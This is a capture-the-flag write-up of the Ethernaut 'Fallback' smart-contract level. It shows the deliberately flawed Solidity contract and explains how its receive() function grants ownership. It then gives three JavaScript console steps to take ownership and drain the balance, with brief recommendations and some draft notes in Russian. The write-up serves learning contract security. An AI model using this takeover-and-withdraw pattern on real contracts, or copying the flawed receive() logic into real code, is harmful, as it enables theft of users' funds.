# 1. Fallback
# Scope
This report covers the analysis of the Ethernaut level "Fallback".
The goal of the challenge is to identify and exploit a vulnerability in the provided contract in order to claim ownership of the contract and reduce its balance to 0.

The contract's code:
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
# System Overview
The contract implements "variable ownership" mechanism: any user who contributes more Ether than the current owner becomes the new owner. The owner is allowed to withdraw the Ether stored in the contract.
Upon deployment, the initial owner's contribution is initialized to 1000 Ether.
# Vulnerability Analysis
## Bad Fallback Function
If the user sends Ether to the contract with no data then the following function is called: 
```js
receive() external payable {
	require(msg.value > 0 && contributions[msg.sender] > 0);
	owner = msg.sender;
}
```
Any user who sends Ether and has a contribution greater than 0 becomes the new owner. This allows the attacker to bypass the intended contract logic.
### Attack Steps
1) Make a small contribution:
```js
await contract.contribute({
    value: toWei("0.0001"),
});
```
2) Send a direct Ether transfer to the contract:
```js
await contract.sendTransaction({
    value: toWei("0.0001"),
});
```
After this, you become the owner of the contract!
3) Withdraw the entire balance:
```js
await contract.withdraw();
```
# Recommendations
Avoid implementing fallback or receive functions that contain conflicting or unintended logic.
.+ сделать чтобы receive() вызывала contribute
# Conclusion
The level demonstrates how a poorly implemented receive (fallback) function can compromise contract ownership allow fund theft.
# Notes
[Ethernaut Fallback Level](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)

Возможно немного добавить рекомендации, мб идентифицировать что за вулна и вставить сюда 